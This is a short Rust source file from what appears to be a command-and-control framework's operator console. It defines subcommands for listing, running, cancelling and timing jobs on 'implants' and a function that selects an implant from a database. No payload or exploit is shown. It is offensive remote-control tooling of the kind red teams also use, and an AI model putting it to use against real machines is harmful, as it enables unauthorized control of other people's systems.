use clap::Subcommand;
use log::{error, info, warn};

use crate::database;

#[derive(Subcommand)]
pub enum ImplantCommands {
    /// Lists jobs numbered by when added
    Jobs,
    /// Runs a speciic command in a terminal (fallback if name conflict)
    Run { cmd: String, args: Vec<String> },
    /// Cancels a job
    Cancel { job: u32},
    /// Tells the implant to sleep after collecting jobs
    Sleep { secs: u32 },
    /// Exits the terminal with client
    Exit,
}

pub async fn select_agent(id: u32) {
    let agent_info = match database::IMPLANT_DB.fetch_implant(id).await {
        Ok(v) => match v {
            Some(v) => v,
            None => {
                warn!("Agent doesn't exist");
                return ;
            },
        },
        Err(e) => {
            error!("failed to fetch implant: {}", e);
            return ;
        },
    };

    crate::SELECTED_AGENT.lock().unwrap().replace((id, agent_info));
    info!("Agent set to {}", id);
}